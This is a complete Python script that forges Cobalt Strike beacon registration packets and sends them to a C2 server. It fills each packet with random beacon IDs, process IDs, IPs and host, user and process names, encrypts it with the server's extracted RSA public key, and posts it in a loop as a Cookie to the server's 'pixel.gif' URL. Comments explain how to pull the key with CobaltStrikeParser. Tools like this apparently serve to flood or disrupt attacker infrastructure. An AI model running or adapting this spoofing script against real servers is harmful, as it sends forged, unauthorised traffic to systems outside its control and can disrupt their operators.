#!/usr/bin/env python
# coding=utf-8
import hexdump
import rsa
import random
import base64
import string
import urllib.request
for _ in range(10):
    #pack = b'\x00\x00\xBE\xEF'  # pack head
    #pack += b'\x00\x00\x00\x4C'  # pack len
    pack = bytearray(random.getrandbits(4) for _ in range(16))  # AESKEY
    pack += b'\xa8\x03'  # name charset  (int) (little)
    pack += b'\xa8\x03'  # name charset  (int) (little)
    # pack+=b'\x00\x00\x00\x06' # Beacon Id random
    pack += random.randint(0 , 9999999) .to_bytes(4, 'big') # Beacon Id
    pack += random.randint(0 , 65535) .to_bytes(4, 'big') # Beacon Pid
    pack += b'\x00\x00'  # Beacon Port
    pack += b'\x04'  # Beacon Flag 04
    pack += b'\x06'
    pack += b'\x02'
    pack += b'\x23\xf0\x00\x00\x00\x00'  # windows version (int)
    pack += b'\x76\x91'  # windows version_1 (int)
    pack += b'\x0a\x60\x76\x90\xf5\x50'
    pack += bytearray(random.getrandbits(4) for _ in range(4))  # Beacon Ip
    #pack += b'\x4b\x4b'+b'\x09'+b'\x63\x63\x63'+b'\x09'+b'\x61'  # Beacon info split 0x09 computer_name user_name process_name
    pack += bytes(''.join(random.sample(string.ascii_letters + string.digits, 6)), encoding = "utf8")+ b'\x09' + bytes(''.join(random.sample(string.ascii_letters + string.digits, 6)), encoding = "utf8") + b'\x09' + bytes(''.join(random.sample(string.ascii_letters + string.digits, 6)), encoding = "utf8")
    pack = b'\x00\x00\xBE\xEF'+len(pack).to_bytes(4, 'big')+pack
    url = 'http://192.168.234.100/pixel.gif' # C2 Server metadata post url (CobaltStrikeParser C2Server)
    pubkey = rsa.PublicKey.load_pkcs1_openssl_pem("""
    -----BEGIN PUBLIC KEY-----
    MIGfXXXXXXXXXXXXXXXX==
    -----END PUBLIC KEY-----
    """)# use the CobaltStrikeParser extract public key from the payload https://github.com/Sentinel-One/CobaltStrikeParser  parse_beacon_config.py payload_url --json
    #Remember to remove the extra padding from the public key
    enpack = rsa.encrypt(pack, pubkey)
    header = {
        'Cookie': base64.b64encode(enpack).decode('utf-8')
    }
    request = urllib.request.Request(url, headers=header)
    reponse = urllib.request.urlopen(request).read()
    #print('base64:', base64.b64encode(enpack).decode('utf-8'))
    #print(hexdump.hexdump(pack))
